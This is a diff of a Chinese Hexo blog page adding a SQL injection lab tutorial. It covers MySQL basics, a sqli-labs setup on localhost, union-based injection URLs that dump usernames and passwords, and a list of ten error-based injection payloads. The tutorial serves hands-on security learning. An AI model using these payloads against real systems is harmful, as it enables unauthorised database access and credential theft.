@@ -18,15 +18,41 @@
   
   
   <title>sql注入 | Hexo</title>
-  <meta property="og:type" content="article">
+  <meta name="description" content="一、MySQL数据库基本操作11.连接mysql:mysql -u root -p   12.创建数据库:create database images(database name);   13.查询所有数据库:show databases;   14.进入数据库:use security;   15.查询当前库所有表:show tables;   16.select 1,2,3;   123456">
+<meta property="og:type" content="article">
 <meta property="og:title" content="sql注入">
 <meta property="og:url" content="http://example.com/2023/12/20/sql%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="一、MySQL数据库基本操作11.连接mysql:mysql -u root -p   12.创建数据库:create database images(database name);   13.查询所有数据库:show databases;   14.进入数据库:use security;   15.查询当前库所有表:show tables;   16.select 1,2,3;   123456">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223192958685.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223201825864.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223202052373.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223202204382.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223202813444.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223203535788.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223205838571.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223210003657.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223210206941.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223210546664.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223210912080.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223210939818.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223211738761.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223212056192.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223212118032.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223212139761.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223220157383.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223220242925.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223220646040.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223220842961.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223221104640.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223221309959.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223221457834.png">
 <meta property="article:published_time" content="2023-12-20T10:27:48.000Z">
-<meta property="article:modified_time" content="2023-12-20T10:27:48.409Z">
+<meta property="article:modified_time" content="2023-12-23T14:39:02.041Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223192958685.png">
   <!-- Canonical links -->
   <link rel="canonical" href="http://example.com/2023/12/20/sql%E6%B3%A8%E5%85%A5/index.html">
   
@@ -354,7 +380,103 @@
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        
+        <h2 id="一、MySQL数据库基本操作"><a href="#一、MySQL数据库基本操作" class="headerlink" title="一、MySQL数据库基本操作"></a>一、MySQL数据库基本操作</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.连接mysql:mysql -u root -p</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223192958685.png" alt="image-20231223192958685"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.创建数据库:create database images(database name);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223201825864.png" alt="image-20231223201825864"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3.查询所有数据库:show databases;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223202052373.png" alt="image-20231223202052373"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4.进入数据库:use security;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223202204382.png" alt="image-20231223202204382"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5.查询当前库所有表:show tables;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223202813444.png" alt="image-20231223202813444"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6.select 1,2,3;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223203535788.png" alt="image-20231223203535788"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">说明:</span><br><span class="line">1.information_schema是MySQL数据库系统中的一个系统数据库，它包含了关于数据库、表、列、索引、权限等方面的元数据信息。</span><br><span class="line">2.information_schma是从MySQL5.0版本开始引入的。</span><br><span class="line">3.SCHEMATA:存储数据库名</span><br><span class="line">  TABLES:存储表名</span><br><span class="line">  COLUMNS:存储字段名</span><br><span class="line">4.GROUP_CONCAT是MySQL中用于字符串拼接的聚合函数。它用于将每个分组中的值连接成一个字符串，并以逗号（默认分隔符）分隔。</span><br><span class="line">（小提示：mysql语句都是以分号结尾的！！！）</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7.爆库:select 1,group_concat(SCHEMA_NAME),3 from information_schema.schemata;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223205838571.png" alt="image-20231223205838571"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8.爆表:select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223210003657.png" alt="image-20231223210003657"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9.爆字段:select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223210206941.png" alt="image-20231223210206941"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.爆数据:select group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from users ;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223210546664.png" alt="image-20231223210546664"></p>
+<h2 id="二、前期准备"><a href="#二、前期准备" class="headerlink" title="二、前期准备"></a>二、前期准备</h2><p>1.在phpstudy的软件管理下载php5.5.9版本。</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223210912080.png" alt="image-20231223210912080"></p>
+<p>2.应用，选择网站，点击管理，php版本，选择php5.5.9；然后在首页重启Apache和MySQL。</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223210939818.png" alt="image-20231223210939818"></p>
+<p>3.添加Firefox插件（HackBar），打开火狐，点击右上角三条杠，选择扩展和主题。</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223211738761.png" alt="image-20231223211738761"></p>
+<p>4.点击设置，选择从文件安装附加组件，选择文件，添加。</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223212056192.png" alt="image-20231223212056192"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223212118032.png" alt="image-20231223212118032"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223212139761.png" alt="image-20231223212139761"></p>
+<h2 id="三、sqli"><a href="#三、sqli" class="headerlink" title="三、sqli"></a>三、sqli</h2><h4 id="1-union联合注入"><a href="#1-union联合注入" class="headerlink" title="1.union联合注入"></a>1.union联合注入</h4><blockquote>
+<blockquote>
+<p>当查询数据时有回显可考虑使用union联合查询的方式</p>
+</blockquote>
+</blockquote>
+<p>①使用order by 猜测列数，报错就是超过列数。</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223220157383.png" alt="image-20231223220157383"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223220242925.png" alt="image-20231223220242925"></p>
+<p>②使用union联合查询，爆出显示位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-1/? id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223220646040.png" alt="image-20231223220646040">③爆库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-1/? id=-1&#x27; union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223220842961.png" alt="image-20231223220842961"></p>
+<p>④爆表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-1/? id=-1&#x27; union  select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database()-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223221104640.png" alt="image-20231223221104640"></p>
+<p>⑤爆字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-1/? id=-1&#x27; union  select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database();--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223221309959.png" alt="image-20231223221309959"></p>
+<p>⑥爆数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-1/? id=-1&#x27; union  select 1,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password),3 from users;-- -</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2.报错注入"></a><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231223221457834.png" alt="image-20231223221457834">2.报错注入</h4><p>当输入id查询，页面没回显，union联合注入不可用，可以考虑报错注入。</p>
+<h6 id="报错注入十大方法："><a href="#报错注入十大方法：" class="headerlink" title="报错注入十大方法："></a>报错注入十大方法：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(1).(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(2).(extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(3).(updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br></pre></td></tr></table></figure>
+
+<p>前三个比较常见，记住！！！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(4).geometrycollection((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(5).multipoint((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(6).polygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(7).multipolygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(8).linestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(9).multilinestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(10).exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h4 id="3-盲注"><a href="#3-盲注" class="headerlink" title="3.盲注"></a>3.盲注</h4><h4 id="4-睡眠"><a href="#4-睡眠" class="headerlink" title="4.睡眠"></a>4.睡眠</h4><h4 id="5-SQLMAP"><a href="#5-SQLMAP" class="headerlink" title="5.SQLMAP"></a>5.SQLMAP</h4>
       
     </div>
     <div class="article-footer">
